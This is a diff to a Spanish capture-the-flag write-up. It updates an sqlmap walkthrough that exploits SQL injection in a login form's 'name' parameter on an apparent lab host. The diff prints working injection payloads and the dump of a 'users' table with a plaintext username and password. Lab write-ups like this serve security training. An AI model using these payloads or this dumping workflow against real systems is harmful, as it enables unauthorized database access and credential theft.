@@ -59,22 +59,22 @@ Utilizando la herramienta SQLMap realizamos la autoexplotación de la vulnerabil
 Ahora pasamos la petición a SLQMap y le dejamos trabajar.
 
 ```
-> sqlmap -r req.txt --dbs                                                       
+> sqlmap -r req.txt -D register -T users --dump                                                                                     
         ___
        __H__
- ___ ___[']_____ ___ ___  {1.8.3#stable}
-|_ -| . [)]     | .'| . |
-|___|_  [(]_|_|_|__,|  _|
+ ___ ___["]_____ ___ ___  {1.8.3#stable}
+|_ -| . [']     | .'| . |
+|___|_  [']_|_|_|__,|  _|
       |_|V...       |_|   https://sqlmap.org
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-[*] starting @ 12:31:17 /2024-09-23/
+[*] starting @ 12:34:00 /2024-09-23/
 
-[12:31:17] [INFO] parsing HTTP request from 'req.txt'
-[12:31:18] [WARNING] provided value for parameter 'submit' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
-[12:31:18] [INFO] resuming back-end DBMS 'mysql' 
-[12:31:18] [INFO] testing connection to the target URL
+[12:34:00] [INFO] parsing HTTP request from 'req.txt'
+[12:34:00] [WARNING] provided value for parameter 'submit' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
+[12:34:00] [INFO] resuming back-end DBMS 'mysql' 
+[12:34:00] [INFO] testing connection to the target URL
 got a 302 redirect to 'http://172.17.0.2/index.php'. Do you want to follow? [Y/n] y
 redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] y
 sqlmap resumed the following injection point(s) from stored session:
@@ -96,85 +96,35 @@ Parameter: name (POST)
     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
     Payload: name=admin' AND (SELECT 2043 FROM (SELECT(SLEEP(5)))TFsI)-- nAJP&password=admin&submit=
 ---
-[12:31:23] [INFO] the back-end DBMS is MySQL
+[12:34:02] [INFO] the back-end DBMS is MySQL
 web server operating system: Linux Ubuntu 22.04 (jammy)
 web application technology: Apache 2.4.52
 back-end DBMS: MySQL >= 5.0 (MariaDB fork)
-[12:31:23] [INFO] fetching database names
-[12:31:23] [INFO] resumed: 'information_schema'
-[12:31:23] [INFO] resumed: 'mysql'
-[12:31:23] [INFO] resumed: 'performance_schema'
-[12:31:23] [INFO] resumed: 'register'
-[12:31:23] [INFO] resumed: 'sys'
-available databases [5]:
-[*] information_schema
-[*] mysql
-[*] performance_schema
-[*] register
-[*] sys
-
-[12:31:23] [INFO] fetched data logged to text files under '/home/rh4ps00dy/.local/share/sqlmap/output/172.17.0.2'
-[12:31:23] [WARNING] your sqlmap version is outdated
-
-[*] ending @ 12:31:23 /2024-09-23/
-```
-
-```
-sqlmap -r req.txt -D register --tables                                                                                              
-        ___
-       __H__
- ___ ___[(]_____ ___ ___  {1.8.3#stable}
-|_ -| . ["]     | .'| . |
-|___|_  [(]_|_|_|__,|  _|
-      |_|V...       |_|   https://sqlmap.org
-
-[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
-
-[*] starting @ 12:33:21 /2024-09-23/
-
-[12:33:21] [INFO] parsing HTTP request from 'req.txt'
-[12:33:21] [WARNING] provided value for parameter 'submit' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
-[12:33:21] [INFO] resuming back-end DBMS 'mysql' 
-[12:33:21] [INFO] testing connection to the target URL
-got a 302 redirect to 'http://172.17.0.2/index.php'. Do you want to follow? [Y/n] y
-redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] y
-sqlmap resumed the following injection point(s) from stored session:
----
-Parameter: name (POST)
-    Type: boolean-based blind
-    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)
-    Payload: name=-5829' OR 2077=2077#&password=admin&submit=
-
-    Type: error-based
-    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
-    Payload: name=admin' OR (SELECT 4254 FROM(SELECT COUNT(*),CONCAT(0x7176707071,(SELECT (ELT(4254=4254,1))),0x7171707a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- ryzS&password=admin&submit=
-
-    Type: stacked queries
-    Title: MySQL >= 5.0.12 stacked queries (comment)
-    Payload: name=admin';SELECT SLEEP(5)#&password=admin&submit=
-
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: name=admin' AND (SELECT 2043 FROM (SELECT(SLEEP(5)))TFsI)-- nAJP&password=admin&submit=
----
-[12:33:23] [INFO] the back-end DBMS is MySQL
-web server operating system: Linux Ubuntu 22.04 (jammy)
-web application technology: Apache 2.4.52
-back-end DBMS: MySQL >= 5.0 (MariaDB fork)
-[12:33:23] [INFO] fetching tables for database: 'register'
-[12:33:23] [INFO] resumed: 'users'
+[12:34:02] [INFO] fetching columns for table 'users' in database 'register'
+[12:34:02] [INFO] resumed: 'username'
+[12:34:02] [INFO] resumed: 'varchar(30)'
+[12:34:02] [INFO] resumed: 'passwd'
+[12:34:02] [INFO] resumed: 'varchar(30)'
+[12:34:02] [INFO] fetching entries for table 'users' in database 'register'
+[12:34:02] [INFO] resumed: 'KJSDFG789FGSDF78'
+[12:34:02] [INFO] resumed: 'dylan'
 Database: register
-[1 table]
-+-------+
-| users |
-+-------+
+Table: users
+[1 entry]
++------------------+----------+
+| passwd           | username |
++------------------+----------+
+| KJSDFG789FGSDF78 | dylan    |
++------------------+----------+
 
-[12:33:23] [INFO] fetched data logged to text files under '/home/rh4ps00dy/.local/share/sqlmap/output/172.17.0.2'
-[12:33:23] [WARNING] your sqlmap version is outdated
+[12:34:02] [INFO] table 'register.users' dumped to CSV file '/home/rh4ps00dy/.local/share/sqlmap/output/172.17.0.2/dump/register/users.csv'
+[12:34:02] [INFO] fetched data logged to text files under '/home/rh4ps00dy/.local/share/sqlmap/output/172.17.0.2'
+[12:34:02] [WARNING] your sqlmap version is outdated
 
-[*] ending @ 12:33:23 /2024-09-23/
+[*] ending @ 12:34:02 /2024-09-23/
 ```
 
+De esta forma conseguimos un nombre de usuario y una contraseña 
 ```
 
 ```
